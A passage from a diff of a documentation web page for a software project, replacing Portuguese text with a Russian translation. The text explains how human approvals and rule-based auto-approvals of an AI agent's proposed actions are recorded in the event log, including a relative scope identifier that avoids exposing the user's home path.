-do escopo; desde a <a href=/brabo/dev/ru/business-rules#rn-609 target=_blank rel="noopener noreferrer" class="">RN-609</a> o evento de uma ação
-<code>terminal</code> leva também <code>scopeRoot</code> — o modo de execução mais um
-identificador RELATIVO da raiz contra a qual o escopo de caminho comparou (o
-<code>workspace_dir_name</code> em <code>container</code>/<code>runner</code>, o segmento abaixo de
-<code>BRABO_PROJECTS_BASE</code> em <code>mounted</code>), nunca o caminho absoluto, que exporia o
-<code>$HOME</code> do usuário a todo membro. A linha do outbox não leva nem <code>reason</code> nem
-<code>scopeRoot</code> — nenhum consumidor do engine os lê. Desde a
-<a href=/brabo/dev/ru/business-rules#rn-614 target=_blank rel="noopener noreferrer" class="">RN-614</a> a tela mostra os dois, numa frase
-montada por uma função só: na linha do evento no painel de log da sessão e no
-card de aprovação (chat da sessão e fila da aba Aprovações). Um evento mais
-antigo diz "não registrado", e o card diz isso quando o evento está fora dos
-eventos carregados naquela tela.</li>
+<li class=""><strong>решение человека</strong> = подсчёт событий <code>proposed_action.approved</code>;</li>
+<li class=""><strong>решение политики</strong> = <code>proposed_action.created</code> со <code>status: auto_approved</code> и актором-агентом. Оно никогда не производит <code>.approved</code> и
+поэтому никогда не путается с нажатием. Его <code>reason</code> говорит, <strong>какое</strong>
+правило автоодобрило — <code>agent_autonomy: auto_approve</code>, строка <code>allow</code> в
+<code>permissions.json</code>, нижняя граница контейнера, <code>escopo: cd dentro da pasta do projeto</code> — точным текстом, который использует <code>decide()</code>. События, записанные
+до <a class="" href=/brabo/dev/ru/business-rules#rn-567>RN-567</a>, не имеют <code>reason</code>: читайте это как
+«не записано», а не как «никакого правила». Причина называет правило, а не
+корень области; начиная с <a class="" href=/brabo/dev/ru/business-rules#rn-609>RN-609</a> событие
+действия <code>terminal</code> несёт также <code>scopeRoot</code> — режим выполнения плюс
+ОТНОСИТЕЛЬНЫЙ идентификатор корня, с которым сравнивала область путей
+(<code>workspace_dir_name</code> в <code>container</code>/<code>runner</code>, сегмент ниже
+<code>BRABO_PROJECTS_BASE</code> в <code>mounted</code>), никогда абсолютный путь, который раскрыл
+бы <code>$HOME</code> пользователя каждому участнику. Строка outbox не несёт ни
+<code>reason</code>, ни <code>scopeRoot</code> — ни один потребитель engine их не читает. Начиная с
+<a class="" href=/brabo/dev/ru/business-rules#rn-614>RN-614</a> экран показывает оба, во фразе,
+собираемой одной функцией: в строке события в панели журнала сессии и в
+карточке одобрения (чат сессии и очередь вкладки Одобрения). Более старое
+событие говорит «не записано», и карточка говорит это, когда событие
+находится вне загруженных на этом экране событий.</li>
 </ul>
-<p>Isso não era verdade até a Fase 12e. As três primeiras linhas iam <strong>só para o
-outbox</strong>, que é transporte — drenado, marcado com <code>processed_at</code> e podado — e
-a decisão sobrevivia só em <code>proposed_actions.decided_at</code>, uma coluna fora da
-timeline que a tela, o Psicólogo e a Anamnese leem. O resultado prático foi
-que "quantas vezes o humano aprovou" não pôde ser respondido no dogfooding da
-Fase 10, que era exatamente a métrica principal daquele experimento.</p>
-<p>O bootstrap de repositório é a exceção deliberada: as mutações que ele propõe
-não emitem <code>proposed_action.created</code> no log, porque já são narradas por
-<code>bootstrap.step_*</code> na mesma sessão — contá-las de novo inflaria a métrica de
-aprovação com trabalho que ninguém aprovou.</div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_yZb9"><a href=https://github.com/daneiel/brabo/blob/dev/docs/reference/permissions.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_ANja aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>Отредактировать эту страницу</a></div><div class="col lastUpdated_Kb4y"><span class=theme-last-updated>Последнее обновление<!-- --> <b><time datetime=2026-10-16T02:29:31.000Z itemprop=dateModified>16 окт. 2026 г.</time></b> от <b>Daniel Souza</b></span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Страница документа"><a class="pagination-nav__link pagination-nav__link--prev" href=/brabo/dev/ru/reference/events><div class=pagination-nav__sublabel>Предыдущая страница</div><div class=pagination-nav__label>Eventos</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/brabo/dev/ru/reference/artifacts><div class=pagination-nav__sublabel>Следующая страница</div><div class=pagination-nav__label>Artefatos</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_wOiH thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#o-arquivo class="table-of-contents__link toc-highlight">O arquivo</a><ul><li><a href=#com-qual-credencial-a-ação-auto-aprovada-executa class="table-of-contents__link toc-highlight">Com qual credencial a ação auto-aprovada executa</a></ul><li><a href=#o-formato-do-padrão class="table-of-contents__link toc-highlight">O formato do padrão</a><li><a href=#como-um-padrão-casa-com-um-comando class="table-of-contents__link toc-highlight">Como um padrão casa com um comando</a><li><a href=#comando-composto class="table-of-contents__link toc-highlight">Comando composto</a><li><a href=#padrões-embutidos class="table-of-contents__link toc-highlight">Padrões embutidos</a><li><a href=#o-que-a-ativação-da-execução-semeia class="table-of-contents__link toc-highlight">O que a ativação da execução semeia</a><li><a href=#a-ordem-completa-da-decisão class="table-of-contents__link toc-highlight">A ordem completa da decisão</a><ul><li><a href=#modo-automático-a-curinga-do-agent_autonomy-rn-153 class="table-of-contents__link toc-highlight">"Modo automático": a curinga do <code>agent_autonomy</code> (RN-153)</a><li><a href=#o-piso-do-container-rn-492rn-493-adr-0134 class="table-of-contents__link toc-highlight">O piso do container (RN-492/RN-493, ADR 0134)</a></ul><li><a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="table-of-contents__link toc-highlight">A fronteira de efeito externo e comando privilegiado (RN-418)</a><li><a href=#path-scope class="table-of-contents__link toc-highlight">Escopo de caminho</a><li><a href=#caps class="table-of-contents__link toc-highlight">Tetos</a><li><a href=#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem class="table-of-contents__link toc-highlight">O que acontece com o agente enquanto a decisão não vem</a><li><a href=#o-que-é-gravado-em-cada-decisão class="table-of-contents__link toc-highlight">O que é gravado em cada decisão</a></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Документация</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/getting-started>Первые шаги</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/architecture>Архитектура</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/business-rules>Бизнес-правила</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/runbook>Руководство по эксплуатации</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Сообщество</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class=footer__link-item>Как внести вклад<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class=footer__link-item>Где попросить помощи<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class=footer__link-item>Безопасность<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Ещё</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CHANGELOG.md target=_blank rel="noopener noreferrer" class=footer__link-item>CHANGELOG<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/LICENSE target=_blank rel="noopener noreferrer" class=footer__link-item>Лицензия MIT<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/THIRD_PARTY_NOTICES.md target=_blank rel="noopener noreferrer" class=footer__link-item>Уведомления о сторонних компонентах<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Daniel Souza. Распространяется по лицензии MIT. Сторонние инструменты сохраняют собственные лицензии — см. Уведомления о сторонних компонентах.</div></div></div></footer></div></body>
+<p>Это не было правдой до Фазы 12e. Первые три строки шли <strong>только в outbox</strong>,
+который является транспортом — дренируется, помечается <code>processed_at</code> и
+обрезается, — а решение выживало лишь в <code>proposed_actions.decided_at</code>, колонке
+вне timeline, которую читают экран, Психолог и Анамнез. Практическим
+результатом было то, что на вопрос «сколько раз человек одобрил» нельзя было
+ответить в dogfooding Фазы 10, а это была ровно главная метрика того
+эксперимента.</p>
+<p>Bootstrap репозитория — намеренное исключение: предлагаемые им изменения не
+выпускают <code>proposed_action.created</code> в журнал, потому что уже описываются
+<code>bootstrap.step_*</code> в той же сессии, — считать их снова раздуло бы метрику
+одобрений работой, которую никто не одобрял.</div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_yZb9"><a href=https://github.com/daneiel/brabo/blob/dev/docs/reference/permissions.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_ANja aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>Отредактировать эту страницу</a></div><div class="col lastUpdated_Kb4y"><span class=theme-last-updated>Последнее обновление<!-- --> <b><time datetime=2026-10-16T03:12:27.000Z itemprop=dateModified>16 окт. 2026 г.</time></b> от <b>Daniel Souza</b></span></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Страница документа"><a class="pagination-nav__link pagination-nav__link--prev" href=/brabo/dev/ru/reference/events><div class=pagination-nav__sublabel>Предыдущая страница</div><div class=pagination-nav__label>Eventos</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/brabo/dev/ru/reference/artifacts><div class=pagination-nav__sublabel>Следующая страница</div><div class=pagination-nav__label>Artefatos</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_wOiH thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#файл class="table-of-contents__link toc-highlight">Файл</a><ul><li><a href=#с-какими-учётными-данными-выполняется-автоодобренное-действие class="table-of-contents__link toc-highlight">С какими учётными данными выполняется автоодобренное действие</a></ul><li><a href=#формат-шаблона class="table-of-contents__link toc-highlight">Формат шаблона</a><li><a href=#как-шаблон-сопоставляется-с-командой class="table-of-contents__link toc-highlight">Как шаблон сопоставляется с командой</a><li><a href=#составная-команда class="table-of-contents__link toc-highlight">Составная команда</a><li><a href=#встроенные-шаблоны class="table-of-contents__link toc-highlight">Встроенные шаблоны</a><li><a href=#что-засевает-активация-исполнения class="table-of-contents__link toc-highlight">Что засевает активация исполнения</a><li><a href=#полный-порядок-решения class="table-of-contents__link toc-highlight">Полный порядок решения</a><ul><li><a href=#автоматический-режим-подстановочный-знак-agent_autonomy-rn-153 class="table-of-contents__link toc-highlight">«Автоматический режим»: подстановочный знак <code>agent_autonomy</code> (RN-153)</a><li><a href=#нижняя-граница-контейнера-rn-492rn-493-adr-0134 class="table-of-contents__link toc-highlight">Нижняя граница контейнера (RN-492/RN-493, ADR 0134)</a></ul><li><a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="table-of-contents__link toc-highlight">Граница внешнего эффекта и привилегированной команды (RN-418)</a><li><a href=#path-scope class="table-of-contents__link toc-highlight">Область путей</a><li><a href=#caps class="table-of-contents__link toc-highlight">Пределы</a><li><a href=#что-происходит-с-агентом-пока-решения-нет class="table-of-contents__link toc-highlight">Что происходит с агентом, пока решения нет</a><li><a href=#что-записывается-при-каждом-решении class="table-of-contents__link toc-highlight">Что записывается при каждом решении</a></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Документация</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/getting-started>Первые шаги</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/architecture>Архитектура</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/business-rules>Бизнес-правила</a><li class=footer__item><a class=footer__link-item href=/brabo/dev/ru/runbook>Руководство по эксплуатации</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Сообщество</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class=footer__link-item>Как внести вклад<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class=footer__link-item>Где попросить помощи<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class=footer__link-item>Безопасность<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Ещё</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CHANGELOG.md target=_blank rel="noopener noreferrer" class=footer__link-item>CHANGELOG<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/LICENSE target=_blank rel="noopener noreferrer" class=footer__link-item>Лицензия MIT<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/THIRD_PARTY_NOTICES.md target=_blank rel="noopener noreferrer" class=footer__link-item>Уведомления о сторонних компонентах<svg width=13.5 height=13.5 aria-label="(откроется в новой вкладке)" class=iconExternalLink_jHTF><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Daniel Souza. Распространяется по лицензии MIT. Сторонние инструменты сохраняют собственные лицензии — см. Уведомления о сторонних компонентах.</div></div></div></footer></div></body>
